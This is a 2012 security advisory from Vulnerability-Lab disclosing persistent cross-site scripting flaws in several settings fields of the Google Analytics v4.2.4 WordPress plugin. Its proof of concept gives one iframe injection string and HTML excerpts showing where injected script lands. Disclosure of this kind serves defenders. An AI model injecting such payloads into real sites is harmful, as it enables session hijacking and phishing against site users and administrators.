Title:
======
Google Analytics v4.2.4 Wordpress - Web Vulnerabilities


Date:
=====
2012-08-22


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=692


VL-ID:
=====
692


Common Vulnerability Scoring System:
====================================
3.5


Introduction:
=============
The Google Analytics for WordPress plugin allows you to track your blog easily and with lots of metadata.
Full list of features:

Simple installation through integration with Google Analytics API: authenticate, select the site you want to track and you re done.
This plugin uses the asynchronous Google Analytics tracking code, the fastest and most reliable tracking code Google Analytics offers.
Option to manually place the tracking code in another location.Automatic Google Analytics site speed tracking.Outbound link & downloads 
tracking.Configurable options to track outbound links either as pageviews.Option to track just downloads as pageviews in Google Analytics.
Allows usage of custom variables in Google Analytics to track meta data on pages. Support for the following custom variables:

Author
Single category and / or multiple categories
Post type (especially useful if you use custom post types)
Logged in users
Publication Year
Tags

Possibility to ignore any user level and up, so all editors and higher for instance. Easily connect your Google AdSense and Google Analytics 
accounts. Option to tag links with Google Analytics campaign tracking, with the option to use hashes (#). Option anonymize IP s, for use in 
countries like Germany. Full debug mode, including Firebug lite and ga_debug.js for debugging Google Analytics issues. Allow local hosting 
of ga.js file. Tracking of search engines not included in Google Analytics default tracking. Tracking of login and registration forms.

(Copy of the Vendor Homepage:  http://wordpress.org/extend/plugins/google-analytics-for-wordpress/  )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple persistent web vulnerabilities in the Google Analytics v4.2.4 Wordpress Application Addon.


Report-Timeline:
================
2012-08-21:	Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
Multiple persistent input validation vulnerabilities are detected in the Google Analytics v4.2.4 Wordpress Application Addon.
The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with low or medium required user inter 
action. The bugs are located on server side in options-general.php page with the bound vulnerable label to use, internal links to track 
as outbound, extensions of files to track as downloads, subdomain tracking, cross-domain tracking, primary domain and custom code parameters. 
Successful exploitation can result in wordpress application account steal, client side phishing & server-side content request manipulation. 
Exploitation requires low or medium user inter action.

Vulnerable Module(s):
				[+] Options General

Vulnerable Parameter(s):
				[+] Label to use
				[+] Primary Domain and Custom Code
				[+] Internal links to track as outbound
				[+] Extensions of files to track as downloads
				[+] Subdomain Tracking
				[+] Cross-Domain Tracking


Proof of Concept:
=================
The persistent vulnerability can be exploited by remote attackers with low required user inter action & low privileged 
application user account. For demonstration or reproduce ...

Inject the following example string to the application input (persistent) or parameter (client side)
String:  >"<iframe src=http://www.vulnerability-lab.com></iframe>


Review:  Options General 

Internal links to track as outbound

<tr id="internallink_row" class=""><th scrope="row" valign="top"><label for="internallink">Internal links to track as outbound:</label></th>
<td valign="top"><input class="text" id="internallink" name="internallink" size="30" value="\" type="text"><[PERSISTENT INJECTED SCRIPT CODE!]")' <"=""></td></tr><tr
class=""><td colspan="2" class="yst_desc"><small>If you 


Label to use

<tbody><tr id="internallink_row" class=""><th scrope="row" valign="top"><label for="internallink">Internal links to track as outbound:</label></th>
<td valign="top"><input class="text" id="internallink" name="internallink" size="30" value="sad" type="text"></td></tr><tr class=""><td colspan="2" class="yst_desc"><small>If you want to track all internal links that begin with <code>/out/</code>, enter <code>/out/</code> in the box above. 
If you have multiple prefixes you can separate them with comma's: <code>/out/,/recommends/</code></small></td></tr><tr id="internallinklabel_row" 
class="yst_row even"><th scrope="row" valign="top"><label for="internallinklabel">Label to use:</label></th>
<td valign="top"><input class="text" id="internallinklabel" name="internallinklabel" 
size="30" value="\" type="text"><[PERSISTENT INJECTED SCRIPT CODE!])' <"=""></td></tr><tr


Custom Code

<tr id="customcode_row" class="yst_row even"><th scrope="row" valign="top"><label for="customcode">Custom Code:</label></th>
<td valign="top"><input class="text" id="customcode" name="customcode" size="30" value="\" type="text"><[PERSISTENT INJECTED SCRIPT CODE!]")' <"=""></td></tr><tr


Risk:
=====
The security risk of the persistent input validation vulnerabilities are estimated as medium.


Credits:
========
Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases 
or trade with fraud/stolen material.

Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register
Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com
Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com
Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other 
media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and 
other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), 
modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.

    				   	Copyright © 2012 | Vulnerability Laboratory



-- 
VULNERABILITY RESEARCH LABORATORY
LABORATORY RESEARCH TEAM
CONTACT: research@vulnerability-lab.com

